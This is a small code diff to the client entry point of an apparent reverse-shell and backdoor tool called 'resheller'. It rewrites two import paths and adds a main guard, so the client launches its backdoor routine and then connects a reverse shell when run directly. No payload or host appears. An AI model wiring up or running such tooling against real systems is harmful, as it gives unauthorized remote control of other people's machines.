@@ -2,8 +2,8 @@
 """resheller.src.client.main"""
 from os import name
 
-from src.client.backdoor import backdoor
-from src.client.reverse_shell import ReverseShell
+from resheller.src.client.backdoor import backdoor
+from resheller.src.client.reverse_shell import ReverseShell
 
 
 def main() -> None:
@@ -17,3 +17,7 @@ def main() -> None:
         backdoor()
     resheller = ReverseShell()
     resheller.connect()
+
+
+if __name__ == "__main__":
+    main()
